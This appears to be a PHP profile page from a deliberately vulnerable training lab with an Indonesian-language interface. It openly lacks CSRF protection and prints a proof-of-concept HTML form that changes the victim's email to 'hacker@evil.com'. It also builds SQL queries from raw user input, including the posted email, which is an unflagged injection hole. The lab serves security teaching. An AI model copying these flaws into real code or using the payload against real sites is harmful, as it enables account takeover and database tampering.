<?php
session_start();
$base_path = './';
include 'db.php';

if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit;
}

$id = $_SESSION['user_id'];
$user_query = mysqli_query($conn, "SELECT * FROM users WHERE id=$id");
$user = mysqli_fetch_assoc($user_query);

$msg = "";

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $new_email = $_POST['email'];
    // VULNERABILITY: No CSRF Token check!
    // This form accepts POST requests from ANY origin.
    if (mysqli_query($conn, "UPDATE users SET email='$new_email' WHERE id=$id")) {
        $msg = "Email berhasil diupdate!";
        $_SESSION['email'] = $new_email;
    } else {
        $msg = "Gagal update email: " . mysqli_error($conn);
    }
}

include 'includes/header.php';
?>

<div class="card">
    <h1>Profil Pengguna</h1>
    
    <?php if ($msg): ?>
        <div class="alert alert-info"><?= $msg ?></div>
    <?php endif; ?>

    <p>Halo, <strong><?= htmlspecialchars($user['username']) ?></strong>!</p>
    <p>Email saat ini: <code><?= htmlspecialchars($user['email']) ?></code></p>
    <p>Role: <span class="badge"><?= htmlspecialchars($user['role']) ?></span></p>

    <hr style="margin: 2rem 0; border: 0; border-top: 1px solid var(--border);">

    <h3>Ganti Email</h3>
    <div class="alert alert-info">
        <strong>📚 Panduan Percobaan:</strong>
        <p>Form ini tidak memiliki CSRF Token. Artinya, website lain bisa mengirim request 'Ganti Email' atas nama Anda.</p>
        <p style="margin-top:0.5rem"><strong>Cara Membuktikan:</strong></p>
        <code style="display:block; background:#fff; padding:10px; margin:5px 0; font-size: 0.85em; border:1px solid #ddd;">
            &lt;!-- Simpan sebagai attack.html --&gt;<br>
            &lt;form action="http://localhost/security-labs/profile.php" method="POST"&gt;<br>
            &nbsp;&nbsp;&lt;input type="hidden" name="email" value="hacker@evil.com"&gt;<br>
            &nbsp;&nbsp;&lt;input type="submit" value="Klik Saya"&gt;<br>
            &lt;/form&gt;
        </code>
        <p>Simpan kode di atas sebagai file HTML baru di komputer Anda, lalu buka dan klik tombolnya saat Anda sedang login di sini.</p>
    </div>
    
    <form method="POST" action="profile.php">
        <label>Email Baru:</label>
        <input type="email" name="email" required placeholder="email@baru.com">
        <button type="submit" class="btn">Simpan Perubahan</button>
    </form>
</div>

<?php include 'includes/footer.php'; ?>